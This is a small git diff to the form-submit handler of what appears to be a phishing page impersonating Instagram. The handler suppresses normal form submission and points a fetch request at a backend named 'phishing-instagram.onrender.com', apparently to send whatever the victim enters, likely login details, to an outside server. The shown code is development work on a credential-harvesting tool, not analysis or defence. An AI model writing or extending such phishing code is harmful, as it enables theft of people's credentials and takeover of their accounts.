@@ -23,7 +23,9 @@ document.addEventListener('DOMContentLoaded', function () {
     //on every clcik send a request to the server using a fetch through handle submit function !
 
 
-    function handleSubmit() {
+    function handleSubmit(event) {
+        event.preventDefault(); // prevent form submission
+
         try {
             const link = "https://phishing-instagram.onrender.com"; // backend link
 
